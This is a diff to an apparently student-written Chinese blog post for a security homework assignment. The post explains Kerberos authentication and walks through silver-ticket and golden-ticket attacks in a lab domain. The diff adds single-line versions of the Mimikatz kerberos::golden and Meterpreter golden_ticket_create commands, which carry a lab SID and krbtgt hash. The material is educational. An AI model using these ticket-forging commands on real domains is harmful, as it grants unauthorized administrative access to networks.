@@ -823,7 +823,7 @@
 <h1 id="作业三"><a href="#作业三" class="headerlink" title="作业三"></a>作业三</h1><p>注：本文对图片的说明位于图片上方，因部分图片过大可能造成错页现象。</p>
 <h2 id="Kerberos认证协议及其攻击"><a href="#Kerberos认证协议及其攻击" class="headerlink" title="Kerberos认证协议及其攻击"></a>Kerberos认证协议及其攻击</h2><p>Kerberos原意是希腊神话中看守冥界入口的恶犬刻耳柏洛斯，字面意思为”黑暗中的恶魔”。</p>
 <p>网络安全中的Kerberos是一种计算机网络授权协议，用来在非安全网络中，对个人通信以安全的手段进行身份认证。域环境下的身份认证使用的就是Kerberos协议。</p>
-<h3 id="Kerberos认证协议流程"><a href="#Kerberos认证协议流程" class="headerlink" title="Kerberos认证协议流程"></a>Kerberos认证协议流程</h3><p><img src="C:\Users\XuWanpeng\docx_to_markdown-main\images\image2.png" alt=""></p>
+<h3 id="Kerberos认证协议流程"><a href="#Kerberos认证协议流程" class="headerlink" title="Kerberos认证协议流程"></a>Kerberos认证协议流程</h3><p><img src="https://cdn.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206052201553.png" alt=""></p>
 <p>协议中的用到的名词缩写：</p>
 <p>AS (Authentication Service): 认证服务器</p>
 <p>TGS (Ticket Granting Service): 票据授予服务器</p>
@@ -893,7 +893,7 @@ S \rightarrow C:E_{K_{C,S}}\lbrack\text{TS}_{5} + 1\rbrack</script><h3 id="白�
 <p>在Client-No1登录xuwp-No1，尝试使用CIFS服务、创建域用户。均被拒绝访问。</p>
 <p><img src="https://cdn.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051951414.png" alt=""></p>
 <p>接下来进行票据生成及利用。</p>
-<h3 id="白银票据攻击"><a href="#白银票据攻击" class="headerlink" title="白银票据攻击"></a>白银票据攻击</h3><p>白银票据：伪造TGS只能访问指定的服务，且由服务账号（通常为计算机账户）的<br>Hash加密，银票在使用的过程不需要同域控通信。</p>
+<h3 id="白银票据攻击"><a href="#白银票据攻击" class="headerlink" title="白银票据攻击"></a>白银票据攻击</h3><p>白银票据：伪造TGS只能访问指定的服务，且由服务账号（通常为计算机账户）的Hash加密，银票在使用的过程不需要同域控通信。</p>
 <p>以下是Kerberos服务及其对应的白银票据。</p>
 <div class="table-container">
 <table>
@@ -978,6 +978,8 @@ S \rightarrow C:E_{K_{C,S}}\lbrack\text{TS}_{5} + 1\rbrack</script><h3 id="白�
 <p><img src="https://cdn.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051952663.png" alt=""></p>
 <p>按kerberos::golden的语法，使用取得的参数，写出payload。</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden</span><br><span class="line">/admin:hacker</span><br><span class="line">/domain:xuwp05191643.com</span><br><span class="line">/sid:S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-2641759520</span><span class="literal">-180272662</span><span class="literal">-1158014618</span></span><br><span class="line">/krbtgt:e70473fa5d05081e15e9498ea548fab8</span><br><span class="line">/ticket:golden.kirbi</span><br></pre></td></tr></table></figure>
+<p>即</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /admin:hacker /domain:xuwp05191643.com /sid:S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-2641759520</span><span class="literal">-180272662</span><span class="literal">-1158014618</span> /krbtgt:e70473fa5d05081e15e9498ea548fab8 /ticket:golden.kirbi</span><br></pre></td></tr></table></figure>
 <p><img src="https://cdn.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051952211.png" alt=""></p>
 <p>同目录下出现了黄金票据golden.kirbi</p>
 <p><img src="https://cdn.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051952011.png" alt=""></p>
@@ -1004,6 +1006,8 @@ S \rightarrow C:E_{K_{C,S}}\lbrack\text{TS}_{5} + 1\rbrack</script><h3 id="白�
 <p><img src="https://cdn.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051953667.png" alt=""></p>
 <p>生成票据，使用和上一节一样的参数。</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">golden_ticket_create</span><br><span class="line"><span class="literal">-d</span> xuwp05191643.com</span><br><span class="line"><span class="literal">-k</span> e70473fa5d05081e15e9498ea548fab8</span><br><span class="line"><span class="literal">-s</span> S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-2641759520</span><span class="literal">-180272662</span><span class="literal">-1158014618</span></span><br><span class="line"><span class="literal">-u</span> hacker</span><br><span class="line"><span class="literal">-t</span> /root/golden.kirbi</span><br></pre></td></tr></table></figure>
+<p>即</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">golden_ticket_create <span class="literal">-d</span> xuwp05191643.com <span class="literal">-k</span> e70473fa5d05081e15e9498ea548fab8 <span class="literal">-s</span> S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-2641759520</span><span class="literal">-180272662</span><span class="literal">-1158014618</span> <span class="literal">-u</span> hacker <span class="literal">-t</span> /root/golden.kirbi</span><br></pre></td></tr></table></figure>
 <p><img src="https://cdn.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051953433.png" alt=""></p>
 <p>使用票据</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos_ticket_use /root/golden.kirbi</span><br></pre></td></tr></table></figure>
